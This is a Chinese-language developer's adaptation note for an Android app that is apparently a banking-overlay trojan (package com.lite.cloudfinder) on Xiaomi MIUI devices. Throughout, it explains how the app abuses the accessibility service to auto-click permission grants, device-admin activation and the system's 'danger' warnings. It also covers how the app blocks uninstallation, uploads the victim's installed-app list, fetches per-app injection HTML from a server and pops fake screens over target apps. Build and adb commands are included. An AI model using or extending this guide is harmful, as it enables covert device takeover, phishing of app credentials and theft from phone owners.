# 小米（MIUI / HyperOS）适配笔记

> 适用：`apk-project/versions/3.5-src`，机型验证：Redmi 23108RN04Y / Android 13 / MIUI V14.0.7.0.TGPEUXM
> 相关代码：`flow/miui/Step1~Step6`、`flow/miui/MiuiNavigator`、`flow/Vendor.kt`

---

## 1. 一句话总览

```
打开无障碍 → VendorFlows.of() → flow/miui/MiuiFlow.start()
   Step1 权限 → Step2 设备管理 → Step3 通知使用权 → Step4 电池策略 → Step5 自启动 → Step6 后台弹出界面
   ↓
OnboardingHooks.complete()：上报应用列表 + 拉注入配置 + 预取模板 HTML
   ↓
前台切到注入目标 App → InjectionActivity 弹出
```

---

## 2. MIUI 私有权限：`MIUIOP(10021)` = 后台弹出界面

**这是小米上最容易被忽略的一个开关，它决定“App 在后台能不能启动 Activity”。**

```
appops name : MIUIOP(10021)        （没有公开的字符串名，只能写数字）
含义        : 允许后台弹出界面 / background start activity
默认值      : ignore（拒绝）
```

### 现象（不开会怎样）

```
ActivityStarterImpl: MIUILOG- Permission Denied Activity :
    Intent { cmp=com.lite.cloudfinder/...InjectionActivity }
```

- 注入页弹不出来
- 我们自己写的“载体 Activity”也起不来（**载体绕过无效，因为载体本身就是被拦的那个**）
- 表现：脚本“没反应”，日志里只有 `Permission Denied`

### 用 adb 直接打开（调试/装机）

```bash
adb shell appops set com.lite.cloudfinder 10021 allow
adb shell appops get com.lite.cloudfinder 10021      # → MIUIOP(10021): allow
```

> ⚠️ **覆盖安装（`pm install -r`）或卸载重装后，这个值会被 MIUI 重置回 `ignore`。**
> 每次装完新包都要重新执行一次，否则注入页/载体 Activity 又会起不来。

### 没有 adb 时走 UI（Step6）

```
应用信息 → 其他权限（权限管理）→ 后台弹出界面 → 弹窗选「始终允许」
```

Step6 的实现要点：

| 环节 | 说明 |
|---|---|
| 打开应用信息页 | 必须走**前台载体** `MiuiCarrierActivity`（服务直接 startActivity 会被 10021 拦） |
| 「其他权限」 | 文案表 `MiuiNavigator.TEXTS["otherPerms"]`，实测命中「其他权限管理」 |
| 「后台弹出界面」 | 文案表 `TEXTS["bgPopup"]` |
| 开关形态 | **不是 Switch，是弹窗列表**：`拒绝 / 始终允许 / 取消` |
| 点击 | 优先点 `TEXTS["allow"]`（始终允许 / Allow all the time / Permitir siempre…），失败再退回找 `isCheckable` 节点 |

---

## 3. 「危险」弹窗（所有敏感权限共用同一模板）

```
Activity: com.miui.securitycenter/.privacymanager.SpecialPermissionInterceptActivity
      或 com.miui.securitycenter/.privacymanager.DeviceManagerApplyActivity
TextView   id=intercept_warn_title       「危险」
CheckBox   id=check_box                  未勾 → 确定按钮 enabled=false
TextView   id=intercept_warn_content_end 「我已知晓…」，clickable（点它也能勾）
Button     id=intercept_warn_allow       「确定」，可能带倒计时「确定（7）」
Button     id=intercept_warn_deny        「取消」
```

处理方式（`MiuiNavigator.passRiskDialog`）：

```
+2 秒  勾「我已知晓」（找不到 check_box 就跳过，绝不误点下层页面）
+12 秒 点「确定」（要求 enabled=true，失败用手势坐标）
```

**不要靠“检测当前是不是危险页”驱动**——早期版本用 `onRiskDialog()` 轮询判断，误判过、把下面的设置页开关点了。正确做法是：**调用方在“知道自己刚触发了危险操作”时直接调用 `passRiskDialog()`**（Step2 点「启用」后、Step3 点开关后）。

---

## 4. 各步骤的页面与实测要点

| 步骤 | 目标页面 / 类 | 关键点 |
|---|---|---|
| Step1 权限 | `GrantPermissionsActivity` | 按 **view-id** 点：`permission_allow_button` → `allow_all` → `foreground_only` → `selected`，**绝不用 one_time**；文字只作兜底且要完全相等 |
| Step2 设备管理 | `com.android.settings/.deviceadmin.DeviceAdminAdd` | 按钮 `id=action_button` text=「启用此设备管理应用」，**clickable=false** → 必须手势点坐标 |
| Step3 通知使用权 | `NotificationAccessSettingsActivity` → 详情页 | 列表点自己那一行 → 详情页点开关；校验读 `Settings.Secure.enabled_notification_listeners`（`NotificationManagerCompat` 有缓存会滞后） |
| Step4 电池策略 | `com.miui.powerkeeper/.ui.HiddenAppsConfigActivity` | 选项是 `RadioButton + CheckedTextView`，点第一项「无限制」；白名单另看 `dumpsys deviceidle whitelist` |
| Step5 自启动 | `com.miui.securitycenter/.permcenter.autostart.AutoStartManagementActivity` | 开关是 `CheckBox id=…:id/sliding_button`（**不是 Switch**）；先按 `id=…:id/title` 找自己那一行，再在同一容器里找开关 |
| Step6 后台弹出界面 | 应用信息 → 其他权限 → 后台弹出界面 | 见第 2 节 |

---

## 5. 调试开关（`flow/miui/MiuiFlow.kt`）

```kotlin
private const val SKIP_STEPS = true      // true = 跳过五步，只做收尾（测注入）
private const val TEST_STEP6 = true      // true = 只跑 Step6（后台弹出界面）
```

调试顺序建议：

```
只测权限/管理员   → SKIP_STEPS=false, TEST_STEP6=false
只测后台弹出界面   → TEST_STEP6=true
只测注入/收尾     → SKIP_STEPS=true,  TEST_STEP6=false
正式              → 两个都 false，且构建不带 -PnoGuide / -PnoGuard
```

---

## 6. 构建与安装

```bash
export JAVA_HOME=/Users/xxx/Downloads/01-墨影/apk-project/tools/jdk-17.0.20.1+1/Contents/Home
export PATH="$JAVA_HOME/bin:$PATH"

# 调试包（无「优化中」、无防卸载守卫）
apk-project/tools/gradle-8.11.1/bin/gradle -p apk-project/versions/3.5-src \
  --offline assembleRelease -PversionCode=N -PversionName=3.5 \
  -PnoGuide=true -PnoGuard=true \
  -x lintVitalAnalyzeRelease -x lintVitalReportRelease -x lintVitalRelease
```

安装注意：

```bash
adb push app-release.apk /data/local/tmp/b.apk
adb shell pm install -r -d /data/local/tmp/b.apk      # MIUI 偶发 USER_RESTRICTED，重试 2~3 次
adb shell appops set com.lite.cloudfinder 10021 allow # ★ 每次装完都要重设
```

卸载注意：设备管理员激活后 `pm uninstall` 会被拦（`DELETE_FAILED_DEVICE_POLICY_MANAGER`）。
调试期如需卸载，先 `设置 → 设备管理 → love → 取消激活`，或临时装一个“启动即撤 admin”的调试组件（用完删掉，不要留在正式包里）。

---

## 7. 注入链路（与厂商无关，但小米上受 10021 影响）

```
① 无障碍连上 → 通道就绪后上报已安装应用（iconList，335 个包）
② InjectRepo.refresh() → GET /api/device-inject-settings?deviceId=&country=
③ InjectRepo.prefetchAll() → 把每个 template_url 的 HTML 存到 filesDir/inj/<pkg>.html
④ 前台包名命中配置且未注入 → InjectionActivity 弹出 → markInjected + POST /api/device-inject-track/inject
```

服务器侧两个已修的问题（上线必看）：

| 问题 | 现象 | 修法 |
|---|---|---|
| `_installed_pkgs` 只有调用没有实现 | 面板「注入应用快捷」永远空 / `已提交 0/0` | 补函数：内存 `S['cache'][dev]['apps']` 优先，读不到再读 `state/store.json` |
| 点「重注」后闪一下「已注入」 | `h_inj_track_act` 只改内存不动 `inj_state` 表 | `reset` 立即清空该包结果，`inject/skip` 同步写库 |

模板 HTML 404 的排查：设备日志 `InjectRepo: prefetch <pkg>: HTTP 404` → 说明服务器上该目标的 `template_url` 文件不存在，需要重新上传。

---

## 8. 已知坑清单

1. **后台启动 Activity 一律被拦**（除非 10021=allow）：服务里不要试图直接 startActivity 拉起系统页，必须用前台载体 Activity。
2. **`pm install -r` 会重置 10021**：每次发版后都要重设，否则注入页弹不出来。
3. **MIUI 按钮普遍 `clickable=false`**：一律 `ACTION_CLICK` 失败后用手势 `dispatchGesture` 按坐标点。
4. **不要用“第一个 Switch / 第一个可点项”**：会点到「love 快捷方式」这类无关开关。
5. **`NotificationManagerCompat.getEnabledListenerPackages` 有缓存**：刚授权读不到，要读 `Settings.Secure.enabled_notification_listeners`。
6. **无障碍被系统关闭**：服务主线程被大量节点扫描卡住会触发 ANR → 系统直接关掉无障碍（`accessibility_enabled` 置 0），扫描要点到为止、别全窗口遍历。
